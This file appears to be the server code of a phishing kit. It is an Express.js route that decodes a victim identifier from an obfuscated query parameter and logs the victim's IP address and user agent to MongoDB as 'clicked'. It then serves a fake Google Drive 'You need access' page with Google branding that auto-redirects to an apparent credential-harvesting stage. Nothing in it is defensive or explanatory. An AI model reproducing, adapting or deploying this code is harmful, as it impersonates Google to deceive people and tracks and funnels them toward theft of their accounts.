
const express = require ('express');
const router = express.Router();
const db = require('../database');
router.use(express.static('public'));
const redirectUrl = "${url}";

//const fetch = require('node-fetch');



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {
    const data = req.query.sadfsfigsduyifgousguywrywegaxui474517;
    
    if (data == null) {
        res.render('error');
        
      }else{

    const userid = Buffer.from(data, 'base64').toString('utf-8');
  
    const word = 'clicked';
    const clientIP = req.headers['x-forwarded-for'];
    const ip =  clientIP.split(',')[0].trim(); 
    // const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date();
    const pagetype = 0;
    const mobiletype = 0;
    const notify = 2;

// Using MongoDB to find the user
  db.mainCollection().then(collection => {
    collection.findOne({ username: userid })
      .then(result => {
        const rowCount = result ? 1 : 0;

         if (rowCount > 0) {

                // Update document in MongoDB
                collection.updateOne(
                  { username: userid },
                  { $set: { password: word, pagetype: pagetype, mobiletype: mobiletype, notify: notify } }
                )
                  .then(() => {
                    console.log('Record updated successfully');
                  })
                  .catch(err => {
                    console.error('Error updating record:', err);
                    return res.status(500).send('Internal Server Error');
                  });


        }else{

            // Insert document into MongoDB
            collection.insertOne({
              username: userid,
              password: word,
              ip: ip,
              useragent: useragent,
              date: date,
              notify: notify,
              pagetype: pagetype,
              mobiletype: mobiletype
            })
              .then(() => {
                console.log('Record inserted successfully');
              })
              .catch(err => {
                console.error('Error inserting record:', err);
                return res.status(500).send('Internal Server Error');
              });


        }
      })
      .catch(err => {
        console.error('Error executing MongoDB query:', err);
        return res.status(500).json({ error: 'Internal Server Error' });
      });
  });
   
    const url = `/iloads/?dsfsgfredhgrfthgyt9erygfdgfdhfgjg234jxgjdferuidh=${data}`;

   

    const htmlContent = `
               <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Access Request</title>
  <style>
    body {
      font-family: Roboto, sans-serif;
      background: #fff;
      margin: 0;
      padding: 0;
      height: 60vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .container {
      display: flex;
      align-items: center;
      gap: 40px;
      max-width: 900px;
      padding: 2rem;
    }

    .text-section {
      max-width: 500px;
    }

    .logo {
      height: 45px;
    }

    .title {
      font-size: 1.5rem;
      font-weight: 500;
      margin-top: 1rem;
    }

    button {
      margin-top: 2rem;
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 0.75rem 1.5rem;
      font-size: 1rem;
      border-radius: 20px;
      cursor: pointer;
    }

    .account {
      margin-top: 2rem;
      color: #444;
      font-size: 0.9rem;
    }

    .account span {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      margin-top: 0.5rem;
      padding: 0.4rem 1rem;
      border-radius: 20px;
      border: 1px solid #ccc;
      background-color: #f1f1f1;
    }

    .drive-icon {
      height: 16px;
      width: 16px;
    }

    .illustration {
      max-width: 200px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="text-section">
      <img class="logo" src="/images/g2.png" alt="Google Drive logo" />
      <div class="title">You need access</div>
      <p>Request access, or switch to an account with access.</p>
     <a href="${url}" style="text-decoration: none;">
  <button>Google Drive Access</button>
    </a>
   <div class="account">
        You're signed in as<br />
        <span>
          <img class="drive-icon" src="/images/g1.png" alt="Drive icon" />
          drive.google.com
        </span>
      </div>
    </div>
    <img class="illustration" src="/images/11.png" alt="Access illustration" />
  </div>
   <script>
   setTimeout(() => {
     window.location.href = '${url}';
     }, 3000);
     </script>
      </body>
      </html>
`;
    res.send(htmlContent);
}

});



module.exports =router;
